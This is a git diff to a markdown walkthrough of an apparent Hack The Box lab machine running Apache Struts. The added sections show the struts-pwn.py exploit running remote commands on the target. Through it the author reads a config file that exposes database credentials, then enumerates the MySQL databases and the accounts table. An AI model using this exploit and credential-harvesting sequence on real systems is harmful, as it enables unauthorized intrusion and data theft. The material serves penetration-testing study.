@@ -467,7 +467,7 @@ Perfect!! We are executing commands as the user tomcat8.
 
 <br />
 
-After probe that can execute commandss, try to gain acces to the system with a reverse shell but in this case it was unsuccessful, so we start enumerating de system with a ls -l of the actual directory:
+After verify that we are able to execute commands, try to gain access to the system with a reverse shell but in this case it was unsuccessful, so we start enumerating de system with a ls -l of the actual directory:
 
 <br />
 
@@ -496,6 +496,111 @@ lrwxrwxrwx 1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8
 <br />
 
 Look at that! There is a file named db_connect, it seems interesting, let's take a look:
+
+<br />
+
+```bash
+❯ python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'cat db_connect'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
+[*] CMD: cat db_connect
+[!] ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
+EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
+Note: Server Connection Closed Prematurely
+
+[ssn]
+user=ssn_admin
+pass=AWs64@on*&
+
+[users]
+user=admin
+pass=admin
+
+[%] Done.
+```
+
+<br />
+
+Perfect! We have database credentials, so we can try to enumerate the Mysql database.
+
+As we can see, there are two databases:
+
+<br />
+
+```bash
+❯ python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysqlshow -u admin -padmin'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
+[*] CMD: mysqlshow -u admin -padmin
+[!] ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
+EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
+Note: Server Connection Closed Prematurely
+
++--------------------+
+|     Databases      |
++--------------------+
+| information_schema |
+| users              |
++--------------------+
+
+[%] Done.
+```
+
+<br />
+
+We are going to list first the users database. It have only one column, accounts:
+
+<br />
+
+```bash
+❯ python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysqlshow -u admin -padmin users'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
+[*] CMD: mysqlshow -u admin -padmin users
+[!] ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
+EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
+Note: Server Connection Closed Prematurely
+
+Database: users
++----------+
+|  Tables  |
++----------+
+| accounts |
++----------+
+
+[%] Done.
+```
+
+<br />
+
+We list its structure and it looks good:
+
+<br />
+
+```bash
+❯ python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysqlshow -u admin -padmin users accounts'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
+[*] CMD: mysqlshow -u admin -padmin users accounts
+[!] ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
+EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
+Note: Server Connection Closed Prematurely
+
+Database: users  Table: accounts
++----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
+| Field    | Type        | Collation          | Null | Key | Default | Extra | Privileges                      | Comment |
++----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
+| fullName | varchar(45) | utf8mb4_general_ci | YES  |     |         |       | select,insert,update,references |         |
+| password | varchar(30) | utf8mb4_general_ci | YES  |     |         |       | select,insert,update,references |         |
+| username | varchar(20) | utf8mb4_general_ci | YES  |     |         |       | select,insert,update,references |         |
++----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
+
+[%] Done.
+```
 
 <br />
 
